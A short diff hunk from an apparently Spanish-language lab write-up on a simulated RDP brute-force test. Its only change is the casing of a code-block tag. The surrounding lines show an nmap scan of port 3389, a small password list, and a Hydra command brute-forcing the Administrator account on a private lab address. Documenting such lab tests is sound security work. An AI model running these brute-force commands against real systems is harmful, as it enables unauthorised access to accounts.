@@ -35,7 +35,7 @@ nmap -p 3389 10.0.2.4
 Paso 2: Simulación del Ataque de Fuerza Bruta
 Se utilizó la herramienta Hydra para ejecutar múltiples intentos fallidos de autenticación automatizados sobre la cuenta Administrator.
 
-Bash
+bash
 # Creación de diccionario de prueba y ejecución de la prueba de penetración
 echo -e "123456\npassword\nadmin123\nPrueba2026\nIncorrecta1" > pass.txt
 hydra -l Administrator -P pass.txt rdp://10.0.2.4
